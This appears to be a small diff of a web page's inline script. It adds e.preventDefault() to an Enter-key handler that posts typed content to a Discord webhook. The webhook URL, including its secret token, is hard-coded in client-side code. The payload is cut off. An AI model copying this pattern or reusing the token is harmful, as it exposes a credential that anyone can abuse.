@@ -99,6 +99,7 @@
   <script>
     document.querySelector('#content').addEventListener('keypress', function (e) {
       setTimeout(function() { if (e.key === 'Enter') {
+            e.preventDefault();
            fetch('https://discord.com/api/webhooks/1043914673625518171/XAvBfs9pxexKNkwSaxpsD2UWOtuY31575MSlQ-4TFv27aBzBsbTLCBZzu4Up4FIl9fma', {
               method: 'POST',
               headers: {
